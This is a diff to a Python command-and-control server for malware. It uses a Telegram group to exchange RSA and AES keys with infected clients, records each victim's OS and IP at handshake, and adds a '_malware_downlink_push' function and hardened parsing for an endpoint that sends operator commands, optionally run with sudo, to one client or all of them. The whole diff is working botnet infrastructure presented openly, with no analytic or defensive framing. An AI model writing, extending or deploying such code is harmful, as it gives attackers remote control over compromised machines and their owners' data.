@@ -416,6 +416,7 @@ def listen_telegram_group():
                             client_id = text.split(":", 1)[1].strip()
                             logger.info(f"🔑 TG Key request from {client_id}")
                             _tg_send_to_channel(f"PUBLIC_KEY:{client_id}:{_rsa_pub_b64}")
+                            _malware_downlink_push(client_id, f"PUBLIC_KEY:{client_id}:{_rsa_pub_b64}")
 
                         # ── 2️⃣ الهاندشيك ──────────────────────────────────────
                         elif text.startswith("HANDSHAKE:"):
@@ -423,14 +424,14 @@ def listen_telegram_group():
                                 parts = text.split(":", 2)
                                 if len(parts) < 3:
                                     continue
-                                client_id      = parts[1]
+                                client_id = parts[1].strip()
                                 key_part, data_part = parts[2].split("|", 1)
 
                                 decrypted_info, aes_key_bytes = _tg_decrypt_first_message(key_part, data_part)
                                 info = json.loads(decrypted_info)
 
-                                tg_sessions[client_id]  = aes_key_bytes
-                                sessions[client_id]     = aes_key_bytes
+                                tg_sessions[client_id] = aes_key_bytes
+                                sessions[client_id] = aes_key_bytes
                                 telegram_clients.add(client_id)
 
                                 clients[client_id] = {
@@ -452,7 +453,9 @@ def listen_telegram_group():
                                     f"✅ TG Handshake OK: {client_id} "
                                     f"— OS: {info.get('os')} IP: {info.get('ip')}"
                                 )
-                                _tg_send_to_channel(f"HANDSHAKE_OK:{client_id}")
+                                ok_line = f"HANDSHAKE_OK:{client_id}"
+                                _tg_send_to_channel(ok_line)
+                                _malware_downlink_push(client_id, ok_line)
 
                             except Exception as e:
                                 logger.error(f"TG Handshake error: {e}")
@@ -791,10 +794,14 @@ def receive_data():
 @rate_limit
 @require_auth
 def receive_command():
-    data = request.json
-    cmd       = data.get("command", "").strip()
-    client_id = data.get("client_id", "all")
-    use_sudo  = bool(data.get("sudo", False))
+    data = request.json or {}
+    cmd = (data.get("command") or "").strip()
+    cid_raw = data.get("client_id", "all")
+    if cid_raw is None or cid_raw == "":
+        client_id = "all"
+    else:
+        client_id = str(cid_raw).strip()
+    use_sudo = bool(data.get("sudo", False))
 
     logger.warning(f"💀 Command received: {cmd} for {client_id} (sudo={use_sudo})")
 
